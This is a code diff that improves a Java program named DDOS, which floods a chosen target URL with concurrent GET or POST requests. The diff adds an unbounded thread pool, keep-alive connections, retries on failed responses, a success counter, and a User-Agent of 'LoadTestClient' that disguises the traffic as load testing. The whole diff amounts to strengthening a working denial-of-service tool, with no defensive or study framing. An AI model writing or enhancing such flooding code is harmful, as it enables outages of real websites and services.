@@ -5,8 +5,8 @@ import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Scanner;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
+import java.util.concurrent.*;
+import java.util.concurrent.atomic.AtomicInteger;
 
 public class DDOS {
     private static String targetUrl;
@@ -14,7 +14,8 @@ public class DDOS {
     private static int requestsPerThread;
     private static int delay;
     private static String requestMethod;
-    private static String postData = "key1 = value1 & key2 = value2";
+    private static String postData = "key1=value1&key2=value2";
+    private static final AtomicInteger successCount = new AtomicInteger(0);
 
     enum HttpMethod {
         GET, POST
@@ -22,15 +23,17 @@ public class DDOS {
 
     public static void main(String[] args) {
         handleInput(args);
-        ExecutorService executor = Executors.newFixedThreadPool(numberOfThreads);
 
+        ExecutorService executor = Executors.newCachedThreadPool(); 
+        
         for (int i = 0; i < numberOfThreads; i++) {
             executor.submit(DDOS::performRequests);
         }
 
-        executor.shutdown();
-        while (!executor.isTerminated()) { }
+        shutdownExecutor(executor);
+
         System.out.println("[INFO] All tasks completed.");
+        System.out.printf("[INFO] Total successful requests: %d%n", successCount.get());
     }
 
     private static void handleInput(String[] args) {
@@ -75,26 +78,35 @@ public class DDOS {
         validateMethod(requestMethod);
 
         if ("POST".equals(requestMethod)) {
-            System.out.print("Enter POST data (key1 = value1 & key2 = value2): ");
+            System.out.print("Enter POST data (key1=value1&key2=value2): ");
             postData = scanner.next();
         }
     }
 
     private static void performRequests() {
         for (int j = 0; j < requestsPerThread; j++) {
-            sendRequest();
+            try {
+                sendRequest();
+                successCount.incrementAndGet();
+                
+            } catch (IOException e) {
+                System.err.printf("[ERROR] Request failed: %s%n", e.getMessage());
+            }
             sleep(delay);
         }
     }
 
-    private static void sendRequest() {
+    private static void sendRequest() throws IOException {
         HttpURLConnection connection = null;
         try {
-            
-            connection = (HttpURLConnection) new URL(targetUrl).openConnection();
+
+            URL url = new URL(targetUrl);
+            connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod(requestMethod);
             connection.setConnectTimeout(5000);
             connection.setReadTimeout(5000);
+            connection.setRequestProperty("Connection", "keep-alive"); 
+            connection.setRequestProperty("User-Agent", "LoadTestClient"); 
             
             if (HttpMethod.POST.name().equals(requestMethod)) {
                 connection.setDoOutput(true);
@@ -109,8 +121,9 @@ public class DDOS {
             String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
             System.out.printf("[INFO] [%s] Resp: %d%n", timestamp, responseCode);
 
-        } catch (IOException e) {
-            System.err.printf("[ERROR] Request failed: %s%n", e.getMessage());
+            if (responseCode != 200) {
+                retryRequest(connection);
+            }
         } finally {
             if (connection != null) {
                 connection.disconnect();
@@ -118,12 +131,34 @@ public class DDOS {
         }
     }
 
+    private static void retryRequest(HttpURLConnection connection) throws IOException {
+        int retries = 3;
+        int responseCode = connection.getResponseCode();
+        while (responseCode != 200 && retries > 0) {
+            System.out.printf("[WARN] Retry %d for response %d%n", 4 - retries, responseCode);
+            retries--;
+            connection.connect();
+            responseCode = connection.getResponseCode();
+        }
+    }
+
     private static void sleep(int delay) {
         try {
-            Thread.sleep(delay);
+            TimeUnit.MILLISECONDS.sleep(delay);
         } catch (InterruptedException e) {
             Thread.currentThread().interrupt();
             System.err.println("[ERROR] Thread was interrupted during sleep: " + e.getMessage());
+        }
+    }
+
+    private static void shutdownExecutor(ExecutorService executor) {
+        executor.shutdown();
+        try {
+            if (!executor.awaitTermination(10, TimeUnit.MINUTES)) {
+                executor.shutdownNow();
+            }
+        } catch (InterruptedException e) {
+            executor.shutdownNow();
         }
     }
 }
